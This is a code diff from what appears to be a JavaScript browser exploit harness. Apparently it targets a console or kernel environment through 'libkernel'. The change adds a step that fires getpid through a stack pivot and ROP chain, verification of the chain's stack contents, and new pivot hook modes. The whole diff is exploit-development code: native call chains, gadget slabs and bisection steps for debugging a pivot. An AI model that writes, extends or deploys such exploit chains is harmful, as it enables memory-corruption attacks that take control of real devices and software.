@@ -72,6 +72,7 @@ import {
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
+    firePivotGetpid,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
     bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS, G0_HOOK_POOPS,
     bisectHookPivotButterfly, verifyPivotHookSaved,
@@ -79,12 +80,12 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     verifyPivotHookWrites,
-    verifySlabContent, resolveBufAddrOff,
+    verifySlabContent, resolveBufAddrOff, verifyStackContent,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830aw";
+const BUILD_ID = "rw-20250830ax";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -752,8 +753,9 @@ function trimBeforeNativeFire() {
 
 function pivotHookMode() {
     const q = params.get("hook");
-    if (q === "cell" || q === "bf" || q === "dual") return q;
-    return "dual";
+    if (q === "cell" || q === "bf" || q === "dual" || q === "cell30" || q === "bf30")
+        return q;
+    return "cell";
 }
 
 function gateNativeFire(p, off) {
@@ -4558,10 +4560,19 @@ function runNativeBisectStep(stepId) {
             requireNativePrep();
             if (!gateNativeFire(p, off)) throw new Error("Verify pivot first (PIVOT-FULL-READY)");
             bisectFlushBeforeFire();
-            bisectLog("BISECT-WARN", "N0 fireNativeCall hook=" + pivotHookMode());
-            pid = firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
-            bisectLog("BISECT-OK", "N0 smoke survived frame=" + pid);
-            state("N0 smoke OK", "ok");
+            const lk0 = lkFromUi();
+            const hm0 = pivotHookMode();
+            if (lk0) {
+                const stub0 = resolveGetpidStubOff(p, lk0, off);
+                bisectLog("BISECT-WARN", "N0 getpid chain_poops lk stub+0x"
+                    + stub0.off.toString(16) + " hook=" + hm0);
+                pid = firePivotGetpid(p, nativePrep, lk0, off, stub0.off, { hook: hm0 });
+            } else {
+                bisectLog("BISECT-WARN", "N0 smoke (no lk — paste lk for getpid) hook=" + hm0);
+                pid = firePivotSmoke(p, nativePrep, off, { hook: hm0 });
+            }
+            bisectLog("BISECT-OK", "N0 survived frame=" + pid);
+            state("N0 OK", "ok");
             break;
         case "layout-smoke":
             requireNativePrep();
@@ -4586,13 +4597,16 @@ function runNativeBisectStep(stepId) {
             try {
                 const slab = verifySlabAddrs(p, nativePrep);
                 const content = verifySlabContent(p, nativePrep);
+                const stack = verifyStackContent(p, nativePrep);
                 bisectLog("BISECT-SLAB", "S=" + slab.S.ok + " K=" + slab.K.ok
                     + " rsp=" + (slab.rsp ? slab.rsp.ok : "?")
-                    + " content=" + content.ok);
+                    + " content=" + content.ok + " stack=" + stack.ok);
                 if (!content.ok)
                     bisectLog("SLAB-CHAIN-BAD", content.reasons.join("; "));
-                else
-                    bisectLog("BISECT-OK", "N2c slab chain OK bufAddr="
+                if (!stack.ok)
+                    bisectLog("STACK-CHAIN-BAD", stack.reasons.join("; "));
+                if (content.ok && stack.ok)
+                    bisectLog("BISECT-OK", "N2c slab+stack OK bufAddr="
                         + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
             } catch (slabErr) {
                 bisectLog("BISECT-FAIL", "N2c " + (slabErr.message || slabErr));
